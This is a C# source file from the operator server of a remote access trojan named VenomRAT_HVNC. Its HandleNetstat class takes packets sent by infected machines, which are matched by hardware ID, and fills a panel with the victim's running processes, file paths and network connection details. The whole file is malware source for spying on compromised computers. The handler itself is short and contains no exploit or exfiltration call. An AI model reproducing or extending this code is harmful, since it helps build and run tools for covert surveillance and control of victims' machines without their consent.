using System;
using System.IO;
using System.Windows.Forms;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Forms;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    public class HandleNetstat
    {
        public void GetProcess(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormNetstat formNetstat = (FormNetstat)Application.OpenForms["Netstat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (formNetstat != null)
                {
                    if (formNetstat.Client == null)
                    {
                        formNetstat.Client = client;
                        formNetstat.listView1.Enabled = true;
                        formNetstat.timer1.Enabled = true;
                    }
                    formNetstat.listView1.Items.Clear();
                    string asString = unpack_msgpack.ForcePathObject("Message").AsString;
                    string[] array = asString.Split(new string[] { "-=>" }, StringSplitOptions.None);
                    for (int i = 0; i < array.Length; i++)
                    {
                        if (array[i].Length > 0)
                        {
                            ListViewItem listViewItem = new ListViewItem
                            {
                                Text = Path.GetFileName(array[i])
                            };
                            listViewItem.SubItems.Add(array[i + 1]);
                            listViewItem.SubItems.Add(array[i + 2]);
                            listViewItem.SubItems.Add(array[i + 3]);
                            listViewItem.ToolTipText = array[i];
                            formNetstat.listView1.Items.Add(listViewItem);
                        }
                        i += 3;
                    }
                }
            }
            catch
            {
            }
        }
    }
}
